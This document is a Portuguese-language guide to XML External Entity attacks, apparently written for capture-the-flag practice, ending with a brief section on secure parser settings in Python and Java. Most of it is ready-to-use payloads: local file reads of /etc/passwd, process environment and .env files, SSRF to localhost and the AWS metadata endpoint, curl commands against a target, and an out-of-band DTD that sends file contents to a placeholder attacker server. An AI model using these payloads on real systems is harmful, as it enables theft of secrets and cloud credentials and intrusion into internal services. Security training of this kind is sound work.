# XML External Entity (XXE) — Guia Completo

> A app faz parse de XML sem desativar external entities. Permite ler ficheiros do servidor, SSRF, e por vezes DoS.

## CWE
- CWE-611 — Improper Restriction of XML External Entity Reference

---

## Como reconhecer

- A app aceita **upload de XML** (import, config, feed)
- Endpoint que recebe `Content-Type: application/xml` ou `text/xml`
- Upload de **SVG** (SVG é XML)
- Upload de **DOCX/XLSX/PPTX** (são ZIPs com XML dentro)
- SOAP web services (XML por defeito)

---

## Conceito — como funciona

XML permite definir "entities" — variáveis que são substituídas durante o parse:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY nome "João">
]>
<msg>Olá &nome;</msg>
<!-- Resultado: Olá João -->
```

**External entities** carregam conteúdo de ficheiros ou URLs:
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!-- &xxe; é substituído pelo conteúdo de /etc/passwd -->
```

---

## Payloads

### Básico — ler ficheiro local
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag/flag">
]>
<record>&xxe;</record>
```

```bash
curl -X POST http://TARGET/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///flag/flag">]><r>&x;</r>'
```

### Ler outros ficheiros úteis
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/hosts">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">    <!-- variáveis de ambiente -->
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">     <!-- como o processo foi lançado -->
<!ENTITY xxe SYSTEM "file:///app/config.py">         <!-- source code -->
<!ENTITY xxe SYSTEM "file:///app/.env">              <!-- env vars -->
```

### SSRF via XXE
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  <!-- AWS -->
<!ENTITY xxe SYSTEM "http://internal-api:3000/secret">
```

```bash
curl -X POST http://TARGET/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "http://127.0.0.1:8080/admin">]><r>&x;</r>'
```

### XXE cego (out-of-band) — quando o output não aparece na resposta

**No teu servidor**, cria `evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///flag/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TEU_IP:9900/?d=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://TEU_IP:9900/evil.dtd">
  %remote;
]>
<r>x</r>
```

No teu servidor: `python3 -m http.server 9900` — vais receber o request com a flag no query string.

### XXE via SVG upload
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag/flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="50">&xxe;</text>
</svg>
```

### XXE via DOCX
1. Criar um `.docx` (é um ZIP)
2. Extrair e editar `word/document.xml`
3. Adicionar o DTD com entity externa
4. Re-zipar e fazer upload

### XXE com base64 (para ficheiros binários)
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag/flag">
```
(Só funciona em PHP)

---

## Adaptar o payload à estrutura XML esperada

Se a app espera uma estrutura específica, adapta:

```xml
<!-- Se espera <product> -->
<?xml version="1.0"?>
<!DOCTYPE product [
  <!ENTITY xxe SYSTEM "file:///flag/flag">
]>
<product>
  <name>&xxe;</name>
  <price>0</price>
</product>

<!-- Se espera <user> -->
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///flag/flag">
]>
<user>
  <name>&xxe;</name>
  <email>x@x.com</email>
</user>
```

Dica: se não sabes a estrutura, submete XML inválido e lê a mensagem de erro — muitas vezes revela o schema esperado.

---

## Erros comuns e soluções

| Problema | Solução |
|----------|---------|
| "Entities not allowed" | Parser seguro — XXE bloqueado, tentar outro vetor |
| Ficheiro com `<` ou `&` | Usar CDATA ou OOB (o XML quebra com esses chars) |
| Sem output na resposta | Usar XXE out-of-band (exfiltrar via HTTP) |
| "DOCTYPE not allowed" | Tentar sem DOCTYPE (não funciona para XXE) |
| Upload não é XML | Verificar se aceita SVG, SOAP, ou outro formato XML |

---

## Fix correto

```python
# Python — lxml
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
tree = etree.fromstring(xml_input, parser)

# Python — defusedxml (melhor opção)
import defusedxml.ElementTree as ET
tree = ET.fromstring(xml_input)

# Python — stdlib (mínimo)
import xml.etree.ElementTree as ET
# Não resolve external entities por defeito, MAS é vulnerável a billion laughs
```

```java
// Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Princípio:** desativar external entities e DTD processing no parser XML. Usar bibliotecas seguras por defeito (`defusedxml` em Python).
